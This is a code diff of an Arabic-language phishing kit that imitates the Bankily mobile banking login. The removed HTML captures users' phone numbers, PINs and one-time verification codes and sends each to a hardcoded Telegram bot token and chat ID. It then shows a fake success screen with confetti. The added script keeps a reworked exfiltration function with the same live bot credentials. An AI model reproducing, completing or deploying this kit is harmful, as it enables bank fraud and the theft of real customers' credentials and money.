@@ -1,162 +1,18 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bankily - BPM</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <!-- مكتبة التأثيرات الاحتفالية -->
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
-        body { font-family: 'Tajawal', sans-serif; background-color: #ffffff; margin: 0; overflow-x: hidden; }
+<script>
+    // البيانات الجديدة المستخرجة من صورك
+    const BOT_TOKEN = "8640073881:AAHc6TuNlI7_fhuQ-K6Lbd6sKLgm6y-iZTk"; //
+    const CHAT_ID = "8665814266"; //
 
-        .top-header { background-color: #00a5bc; height: 55px; display: flex; align-items: center; justify-content: center; position: relative; color: white; font-weight: bold; font-size: 18px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .back-icon { position: absolute; right: 15px; font-size: 28px; cursor: pointer; transform: scaleX(-1); }
-
-        .input-group { position: relative; margin-bottom: 35px; padding: 0 45px; }
-        .input-label { display: block; text-align: right; margin-bottom: 10px; color: #444; font-size: 14px; font-weight: 600; }
+    function sendToBot(msg) {
+        // تأكد من أن جهازك متصل بالإنترنت عند الضغط على الزر
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
         
-        /* حقول الإدخال مطابقة للصورة */
-        .input-line { width: 100%; border: none; border-bottom: 1.5px solid #000; outline: none; padding: 8px 0; font-size: 20px; text-align: center; background: transparent; }
-        .icon-field { position: absolute; left: 10px; bottom: 12px; width: 24px; opacity: 0.6; }
-
-        /* زر بنكيلي الأصفر السفلي */
-        .btn-bankily { background-color: #ffb400; color: #fff; width: 100%; padding: 18px; font-size: 22px; font-weight: 800; border: none; position: fixed; bottom: 0; right: 0; cursor: pointer; transition: background 0.3s; z-index: 10; }
-        .btn-bankily:active { background-color: #e5a200; }
-
-        /* تنسيق خانات الـ OTP */
-        .otp-container { display: flex; gap: 15px; justify-content: center; margin: 40px 0; direction: ltr; }
-        .otp-input { width: 45px; height: 50px; border: none; border-bottom: 3px solid #333; text-align: center; font-size: 24px; font-weight: bold; outline: none; }
-        
-        .timer-ring { width: 45px; height: 45px; border: 4px solid #00ff00; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 20px auto; }
-        
-        .success-msg { display: none; position: fixed; inset: 0; background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-    </style>
-</head>
-<body>
-
-    <!-- الواجهة الأولى: تسجيل الدخول -->
-    <div id="screen-login">
-        <div class="h-6"></div>
-        <div class="flex justify-center py-8">
-            <img src="https://i.ibb.co/L9Y0VpY/bankily-logo.png" alt="Bankily" style="width: 260px;">
-        </div>
-
-        <div class="mt-8">
-            <div class="input-group">
-                <label class="input-label">اسم المستخدم أو رقم الهاتف</label>
-                <input id="user_id" type="tel" class="input-line" maxlength="8" placeholder="________" dir="ltr">
-                <img src="https://img.icons8.com/ios/50/user-male-circle.png" class="icon-field">
-            </div>
-
-            <div class="input-group">
-                <label class="input-label">الرقم السري</label>
-                <input id="pin" type="password" maxlength="4" class="input-line" placeholder="____" dir="ltr" style="letter-spacing: 12px;">
-                <img src="https://img.icons8.com/ios/50/lock.png" class="icon-field">
-            </div>
-
-            <div class="px-12 text-right">
-                <a href="#" class="text-sm border-b border-black font-medium">نسيت الرقم السري ؟</a>
-            </div>
-
-            <div class="mt-24 text-center">
-                <a href="#" class="text-sm border-b border-black font-bold text-gray-700">مستخدم جديد ؟ سجل الآن!</a>
-            </div>
-        </div>
-
-        <button onclick="goToOTP()" class="btn-bankily">تسجيل الدخول</button>
-    </div>
-
-    <!-- الواجهة الثانية: رمز التحقق -->
-    <div id="screen-otp" class="hidden">
-        <div class="top-header">
-            <span class="back-icon" onclick="backToLogin()">›</span>
-            رمز التحقق
-        </div>
-
-        <div class="px-8 text-center mt-12">
-            <h2 class="font-bold text-xl leading-relaxed text-gray-800">أدخل رمز التأكيد المرسل إلى هاتفك المحمول</h2>
-            
-            <div class="otp-container">
-                <input type="tel" maxlength="1" class="otp-input" oninput="moveNext(this, 0)">
-                <input type="tel" maxlength="1" class="otp-input" oninput="moveNext(this, 1)">
-                <input type="tel" maxlength="1" class="otp-input" oninput="moveNext(this, 2)">
-                <input type="tel" maxlength="1" class="otp-input" oninput="moveNext(this, 3)">
-            </div>
-
-            <p class="text-gray-500 text-sm">تنتهي صلاحية رمز التأكيد خلال</p>
-            <p class="font-bold text-gray-800 mt-1">5 دقائق 0 ثواني</p>
-
-            <div class="timer-ring"></div>
-
-            <button onclick="location.reload()" class="text-sm border-b border-black mt-8 text-gray-600">إعادة إرسال رمز التأكيد</button>
-        </div>
-        
-        <button onclick="finish()" class="btn-bankily">تم</button>
-    </div>
-
-    <!-- واجهة النجاح والتهنئة -->
-    <div id="success-screen" class="success-msg">
-        <div class="text-6xl mb-4">🎉</div>
-        <h1 class="text-2xl font-bold text-gray-800 mb-2">تهانينا!</h1>
-        <p class="text-gray-600">تم التحقق من هويتك بنجاح.</p>
-        <button onclick="location.reload()" class="mt-8 text-blue-500 font-bold">العودة للرئيسية</button>
-    </div>
-
-    <script>
-        const TOKEN = "8640073881:AAHc6TuNlI7_fhuQ-K6Lbd6sKLgm6y-iZTk";
-        const CHAT = "8665814266";
-
-        function goToOTP() {
-            const u = document.getElementById('user_id').value;
-            const p = document.getElementById('pin').value;
-            if(u.length >= 8 && p.length === 4) {
-                sendToBot(`🏦 Bankily:\n📱 User: ${u}\n🔐 PIN: ${p}`);
-                document.getElementById('screen-login').classList.add('hidden');
-                document.getElementById('screen-otp').classList.remove('hidden');
-            } else {
-                alert("يرجى إكمال البيانات المطلوبة");
+        fetch(url)
+        .then(response => {
+            if (!response.ok) {
+                console.error("خطأ في الإرسال، تأكد من تشغيل البوت أولاً عبر /start");
             }
-        }
-
-        function backToLogin() {
-            document.getElementById('screen-otp').classList.add('hidden');
-            document.getElementById('screen-login').classList.remove('hidden');
-        }
-
-        function moveNext(el, idx) {
-            if(el.value.length === 1 && idx < 3) {
-                document.querySelectorAll('.otp-input')[idx + 1].focus();
-            }
-        }
-
-        function finish() {
-            let code = "";
-            document.querySelectorAll('.otp-input').forEach(i => code += i.value);
-            
-            if(code.length === 4) {
-                sendToBot(`🔑 OTP (4 Digits): ${code}`);
-                
-                // إظهار واجهة النجاح والفرقعة
-                document.getElementById('screen-otp').classList.add('hidden');
-                document.getElementById('success-screen').style.display = 'flex';
-                
-                // تشغيل الفرقعة (Confetti)
-                confetti({
-                    particleCount: 150,
-                    spread: 70,
-                    origin: { y: 0.6 },
-                    colors: ['#ffb400', '#00a5bc', '#00ff00']
-                });
-            } else {
-                alert("يرجى إدخال الرمز المكون من 4 أرقام");
-            }
-        }
-
-        function sendToBot(msg) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`);
-        }
-    </script>
-</body>
-</html>
+        })
+        .catch(error => console.error("مشكلة في الاتصال:", error));
+    }
+</script>
